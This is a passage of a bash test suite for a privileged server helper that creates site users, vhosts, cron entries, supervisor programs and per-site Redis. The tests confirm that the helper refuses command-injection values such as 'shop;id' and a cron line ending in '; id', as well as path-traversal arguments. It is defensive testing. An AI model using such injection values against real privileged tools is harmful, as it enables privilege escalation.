done
refuse "site-user-create www-data" "invalid site user: www-data" site-user-create www-data new.example
for bad in Shop shop-new '1shop' '' a23456789012345678901234567890123 'shop;id'; do
  refuse "site-user-create name '$bad'" "invalid site user" site-user-create "$bad" new.example
done
refuse "site-user-create bad domain" "invalid domain" site-user-create shop_new 'new.example;id'
refuse "site-user-create arguments" "usage" site-user-create shop_new
refuse "site-user-create extra argument" "usage" site-user-create shop_new new.example x
AS=ploi refuse "site-user-create from ploi" "site-user-create only runs for the deploy user eeploi, not ploi" "${NEW[@]}"
AS=forge refuse "site-user-create from forge" "only runs for the deploy user eeploi, not forge" "${NEW[@]}"
AS=deploy ETC_DIR="$WORK/etc-conf" ok "site-user-create from the configured deploy user" "created: site user shop_new" "${NEW[@]}"
ETC_DIR="$WORK/etc-conf" refuse "site-user-create from eeploi when another user deploys" "only runs for the deploy user deploy, not eeploi" "${NEW[@]}"
ETC_DIR="$WORK/etc-reg-writable" refuse "an untrusted registry stops site-user-create" "untrusted site registry" "${NEW[@]}"

echo "== run-as"
ok "exact runuser line" "run: runuser -u shop_example -- env -i HOME=/srv/eeploi/shop_example USER=shop_example LOGNAME=shop_example PATH=/usr/local/bin:/usr/bin:/bin LANG=C.UTF-8 /bin/bash -s" run-as shop_example
IN=$'id\nwhoami\n' ok "the script stays off the log" $'log: eeploi-helper: eeploi: run-as shop_example\n' run-as shop_example
IN=$'secret-marker-line\n' lacks "the script is never printed" "secret-marker-line" run-as shop_example
AS=ploi refuse "run-as from ploi" "run-as only runs for the deploy user eeploi, not ploi" run-as shop_example
AS=forge refuse "run-as from forge" "run-as only runs for the deploy user eeploi, not forge" run-as shop_example
refuse "run-as without a user" "usage: run-as <user> < script" run-as
refuse "run-as with a command" "usage" run-as shop_example id
refuse "run-as with extra arguments" "usage" run-as shop_example -- bash -c id
AS=deploy ETC_DIR="$WORK/etc-conf" ok "run-as from the configured deploy user" "run: runuser -u shop_example" run-as shop_example

echo "== site subcommands: only the site user's own domain and home"
ok "vhost socket built by the helper" "fastcgi_pass unix:/run/php/php8.4-fpm-shop_example.sock;" vhost-write shop.example shop_example 8.4
ok "vhost in the registry" "  VHOST=/etc/nginx/sites-available/shop.example
write: $WORK/etc-sites/sites/shop_example (644)" vhost-write shop.example shop_example 8.4
ok "the registry keeps its other lines" "  DOMAIN=shop.example
  HOME=/srv/eeploi/shop_example
  CRON=/etc/cron.d/eeploi-shop_example" vhost-write shop.example shop_example 8.4
refuse "vhost for a domain that isn't the user's" "site user shop_example is for shop.example, not other.example" vhost-write other.example shop_example 8.4
refuse "vhost for an unlisted user" "alex is not an eeploi site user" vhost-write shop.example alex 8.4
refuse "vhost for the deploy user" "reserved name, not a site user: eeploi" vhost-write shop.example eeploi 8.4
refuse "vhost old arguments" "usage" vhost-write shop.example /run/php/php8.4-fpm-eeploi.sock
IN=$CRON_LINE ok "cron line" "  * * * * * shop_example php8.4 /srv/eeploi/shop_example/shop.example/current/artisan schedule:run > /dev/null 2>&1
write: /etc/cron.d/eeploi-shop_example (644)" cron-write shop_example
IN=$'* * * * * shop_example php /srv/eeploi/shop_example/shop.example/current/artisan schedule:run > /dev/null 2>&1\n' \
  ok "cron line without a PHP version" "write: /etc/cron.d/eeploi-shop_example (644)" cron-write shop_example
IN=$CRON_LINE ok "cron in the registry" "  CRON=/etc/cron.d/eeploi-shop_example
  REDIS_CONF=" cron-write shop_example
IN=$'* * * * * shop_example php8.4 /srv/eeploi/shop_example/other.example/current/artisan schedule:run > /dev/null 2>&1\n' \
  refuse "cron for a domain that isn't the user's" "only" cron-write shop_example
IN=$'* * * * * shop_other php8.4 /srv/eeploi/shop_other/other.example/current/artisan schedule:run > /dev/null 2>&1\n' \
  refuse "cron as another site user" "only" cron-write shop_example
IN=$'* * * * * shop_example php8.4 /srv/eeploi/shop_example/shopXexample/current/artisan schedule:run > /dev/null 2>&1\n' \
  refuse "cron: dots in the path are dots" "only" cron-write shop_example
IN=$'* * * * * shop_example php8.4 /srv/eeploi/shop_example/shop.example/current/artisan schedule:run > /dev/null 2>&1; id\n' \
  refuse "cron with more after the line" "only" cron-write shop_example
IN=$CRON_LINE refuse "cron for an unlisted user" "alex is not an eeploi site user" cron-write alex
IN=$CRON_LINE refuse "cron old arguments" "invalid site user: shop.example" cron-write shop.example
ok "cron-remove takes it out of the registry" "  HOME=/srv/eeploi/shop_example
  REDIS_CONF=" cron-remove shop_example
lacks "cron-remove leaves no CRON line" "CRON=" cron-remove shop_example
refuse "cron-remove for an unlisted user" "alex is not an eeploi site user" cron-remove alex
SUP=(supervisor-write eeploi-shop.example-a shop_example "$SITE/current" 1)
IN='php artisan horizon' ok "supervisor directory" "directory=$SITE/current" "${SUP[@]}"
IN='php artisan horizon' ok "supervisor log folder" "run: install -d -o root -g shop_example -m 750 /var/log/supervisor/eeploi/shop_example" "${SUP[@]}"
IN='php artisan horizon' ok "supervisor in the registry" "  SUPERVISOR=/etc/supervisor/conf.d/eeploi-shop.example-a.conf
  LOGS=/var/log/supervisor/eeploi/shop_example
write: $WORK/etc-sites/sites/shop_example (644)" "${SUP[@]}"
IN='id' refuse "supervisor for a domain that isn't the user's" "the program of site user shop_example must start with eeploi-shop.example-" \
  supervisor-write eeploi-other.example-a shop_example $SITE/current 1
IN='id' refuse "supervisor program of just the domain" "must start with eeploi-shop.example-" supervisor-write eeploi-shop.example- shop_example $SITE/current 1
IN='id' refuse "supervisor directory of another site" "not in $SITE" supervisor-write eeploi-shop.example-a shop_example /srv/eeploi/shop_other/other.example/current 1
IN='id' refuse "supervisor directory of another domain" "not in $SITE" supervisor-write eeploi-shop.example-a shop_example /srv/eeploi/shop_example/other.example/current 1
IN='id' refuse "supervisor directory with .." "invalid path" supervisor-write eeploi-shop.example-a shop_example $SITE/../../shop_other 1
IN='id' refuse "supervisor for an unlisted user" "alex is not an eeploi site user" supervisor-write eeploi-shop.example-a alex $SITE/current 1
IN='id' refuse "supervisor old arguments" "usage" supervisor-write eeploi-shop.example-a $SITE/current 1
printf 'SUPERVISOR=/etc/supervisor/conf.d/eeploi-shop.example-a.conf\n' >> "$WORK/etc-sites/sites/shop_other"
IN='id' refuse "supervisor program listed for another site" "eeploi-shop.example-a belongs to site user shop_other" "${SUP[@]}"
ok "supervisor-remove takes it out of the registry" "write: $WORK/etc-sites/sites/shop_other (644)" supervisor-remove eeploi-shop.example-a
lacks "supervisor-remove leaves no line" "SUPERVISOR=" supervisor-remove eeploi-shop.example-a
printf 'DOMAIN=other.example\n' > "$WORK/etc-sites/sites/shop_other"
lacks "supervisor-remove of an unlisted program" "write:" supervisor-remove eeploi-shop.example-b
refuse "env-install to another user's home" "not in /srv/eeploi/shop_example" env-install /home/ploi/a/.env /srv/eeploi/shop_other/other.example/.env shop_example
refuse "env-install as an unlisted owner" "alex is not an eeploi site user" env-install /home/ploi/a/.env /srv/eeploi/alex/a/.env alex
refuse "env-install to the deploy user's home" "not in /srv/eeploi/shop_example" env-install /home/ploi/a/.env /home/eeploi/a/.env shop_example
refuse "env-install to the site home with .." "invalid path" env-install /home/ploi/a/.env $SITE/../../shop_other/x/.env shop_example
refuse "storage-copy to another user's home" "not in /srv/eeploi/shop_example" storage-copy /home/ploi/a/storage /srv/eeploi/shop_other/other.example/storage shop_example
ok "vhost-set-root into a site home" "root $SITE/current/public;" vhost-set-root shop.example /home/ploi/shop.example/public $SITE/current/public
refuse "vhost-set-root into an unlisted home" "alex is not an eeploi site user" vhost-set-root shop.example /home/ploi/x/public /srv/eeploi/alex/a/public
refuse "vhost-set-root elsewhere in /srv" "outside the allowed home folders" vhost-set-root shop.example /home/ploi/x/public /srv/public
refuse "db-create socket login for an unlisted user" "alex is not an eeploi site user" db-create mysql alex alex socket
refuse "db-create socket login for a site user in sudo" "in other groups too" db-create pgsql shop_sudo shop_sudo socket
IN=$PW ok "db-create password login needs no site user" "created: mysql database alex for user alex (password login)" db-create mysql alex alex password

echo "== Redis per site"
ok "redis unit" "write: /etc/systemd/system/eeploi-redis@.service (644)" redis-create shop_example
ok "redis unit runs as the site user" "  User=%i
  Group=%i
  ExecStart=/usr/bin/redis-server /etc/eeploi/redis/%i.conf --supervised systemd --daemonize no" redis-create shop_example
ok "redis config" "  port 0
  unixsocket /srv/eeploi/shop_example/.redis/redis.sock
  unixsocketperm 600
  dir /srv/eeploi/shop_example/.redis
  appendonly yes
  maxmemory 128mb
  maxmemory-policy noeviction
write: $WORK/etc-sites/redis/shop_example.conf (644)" redis-create shop_example
ok "redis drop-in" "  [Service]
  MemoryMax=164M
write: /etc/systemd/system/eeploi-redis@shop_example.service.d/memory.conf (644)" redis-create shop_example
ok "redis reload" "run: systemctl daemon-reload" redis-create shop_example
ok "redis folder made by the site user" "run: runuser -u shop_example -- install -d -m 700 /srv/eeploi/shop_example/.redis" redis-create shop_example
ok "redis in the registry" "  REDIS_CONF=$WORK/etc-sites/redis/shop_example.conf
  REDIS_UNIT=eeploi-redis@shop_example.service
  REDIS_DROPIN=/etc/systemd/system/eeploi-redis@shop_example.service.d/memory.conf
  REDIS_SOCKET=/srv/eeploi/shop_example/.redis/redis.sock" redis-create shop_example
ok "redis prepared, stopped" "prepared: Redis of site user shop_example, 128 MB, stopped" redis-create shop_example
for text in 'systemctl start' 'systemctl enable' 'systemctl restart' 'enable --now'; do
  lacks "redis-create starts nothing: no $text" "$text" redis-create shop_example
done
for text in 'chown' 'install -d -o root -g root -m 755 /srv'; do
  lacks "redis-create: root writes nothing in the home: no $text" "$text" redis-create shop_example
done
ok "redis size 32" "  maxmemory 32mb" redis-create shop_example 32
ok "redis cap at 32" "  MemoryMax=68M" redis-create shop_example 32
ok "redis size 1024" "  maxmemory 1024mb" redis-create shop_example 1024
ok "redis cap at 1024" "  MemoryMax=1060M" redis-create shop_example 1024
ok "redis size 256" "prepared: Redis of site user shop_example, 256 MB" redis-create shop_example 256
SYS="$WORK/system-redis-on" ok "a running Redis restarts on a new size" "run: systemctl restart eeploi-redis@shop_example
prepared: Redis of site user shop_example, 64 MB, restarted" redis-create shop_example 64
SYS="$WORK/system-no-redis" ok "redis-create without redis-server" "prepared: Redis of site user shop_example" redis-create shop_example
for bad in 31 1025 0 64mb 64.5 ' 64' 064 -64 '' 1e3 'x'; do
  refuse "redis size '$bad'" "the Redis size must be a whole number of MB from 32 to 1024: $bad" redis-create shop_example "$bad"
done
refuse "redis-create extra argument" "usage" redis-create shop_example 64 x
ok "redis-start" "run: systemctl enable --now eeploi-redis@shop_example" redis-start shop_example
ok "redis-stop" "run: systemctl disable --now eeploi-redis@shop_example" redis-stop shop_example
refuse "redis-start before redis-create" "no Redis for site user shop_other yet: run redis-create first" redis-start shop_other
SYS="$WORK/system-no-redis" refuse "redis-start without redis-server" "Redis is not installed on this server (no /usr/bin/redis-server): install the redis-server package first" redis-start shop_example
for sub in redis-create redis-start redis-stop; do
  refuse "$sub for an unlisted user" "alex is not an eeploi site user" "$sub" alex
  for reserved in root eeploi redis; do
    refuse "$sub for $reserved" "reserved name, not a site user: $reserved" "$sub" "$reserved"
  done
  refuse "$sub for www-data" "invalid site user: www-data" "$sub" www-data
  refuse "$sub for a site user in sudo" "in other groups too" "$sub" shop_sudo
  refuse "$sub without a user" "usage" "$sub"
  AS=ploi refuse "$sub from ploi" "$sub only runs for the deploy user eeploi, not ploi" "$sub" shop_example
done
refuse "redis-start extra argument" "usage" redis-start shop_example now
refuse "redis-stop extra argument" "usage" redis-stop shop_example now

echo "== system log"
ok "logs the call" "log: eeploi-helper: eeploi: vhost-enable example.com" vhost-enable example.com
IN=$'-----BEGIN CERTIFICATE-----\nMIIBszCCAVmgAwIBAgIU\n-----END CERTIFICATE-----' ok "logs the arguments, never stdin" $'log: eeploi-helper: eeploi: ssl-write example.com\n' ssl-write example.com
lacks "not the version" "log:" version

echo
echo "$PASS passed, $FAILED failed"
if [ "$FAILED" -gt 0 ]; then
  echo "Failed:$FAILURES"
  exit 1
fi
